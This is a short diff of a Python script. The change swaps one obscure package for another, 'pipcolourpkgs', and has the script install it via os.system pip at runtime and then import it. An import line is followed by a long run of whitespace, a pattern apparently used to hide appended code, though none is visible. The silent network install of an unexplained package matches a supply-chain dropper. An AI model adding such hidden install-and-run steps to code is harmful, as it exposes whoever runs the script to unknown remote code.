@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncolourmoduleV2")
-import pythoncolourmoduleV2
+os.system("pip install pipcolourpkgs")
+import pipcolourpkgs
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
